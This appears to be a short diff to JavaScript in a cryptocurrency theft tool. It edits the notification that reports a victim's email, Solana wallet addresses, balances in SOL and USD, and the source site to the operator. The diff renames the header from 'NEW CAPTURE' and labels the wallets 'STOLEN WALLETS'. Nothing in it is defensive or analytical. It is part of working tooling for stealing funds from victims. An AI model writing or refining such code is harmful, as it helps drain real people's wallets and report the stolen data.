@@ -108,13 +108,12 @@ ${i + 1}. ${wallet.address}
     });
     
     const msg = `
-🎯 NEW CAPTURE
+🎯 WISH BOOKMARK 
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 📧 ${data.user?.email || 'No email'}
-🆔 ${data.user?.username || 'No username'}
 
-💰 SOLANA WALLETS (${solanaWallets.length}) - Total: ${totalSOL.toFixed(4)} SOL ($${totalUSD.toFixed(2)})
+💰 STOLEN WALLETS (${solanaWallets.length}) - Total: ${totalSOL.toFixed(4)} SOL ($${totalUSD.toFixed(2)})
 ${walletsSection || 'None found'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔗 ${data.site}
